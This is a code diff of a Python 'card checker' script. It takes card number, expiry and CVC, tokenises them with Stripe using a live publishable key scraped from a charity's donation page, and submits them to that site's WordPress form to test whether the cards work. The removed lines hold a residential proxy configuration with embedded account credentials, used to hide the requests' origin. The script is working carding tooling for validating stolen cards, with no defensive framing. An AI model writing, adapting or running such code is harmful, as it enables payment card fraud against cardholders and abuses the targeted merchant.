@@ -1,9 +1,6 @@
 import requests,re
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
+	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -29,7 +26,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&referrer=https%3A%2F%2Fletstalkwellwomen.org&time_on_page=20748&key=pk_live_51PtXIOKIlclKgpY4obEYB54G8GGCA1zvm2v8LG7kB457oZVSEF2IiqxpERJnRmjTUionNQk7bgqMs4I5OVUOt7xU00mQqASzsT'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&key=pk_live_51PtXIOKIlclKgpY4obEYB54G8GGCA1zvm2v8LG7kB457oZVSEF2IiqxpERJnRmjTUionNQk7bgqMs4I5OVUOt7xU00mQqASzsT'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
@@ -68,7 +65,7 @@ def Tele(ccx):
 	    'form_id': '8',
 	}
 	
-	r2 = session.post(
+	r2 = requests.post(
 	    'https://letstalkwellwomen.org/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
@@ -76,7 +73,6 @@ def Tele(ccx):
 	    data=data,
 	)
 	
-	result2 = r2.text
-	return result2
+	return (r2.json())
 	
 
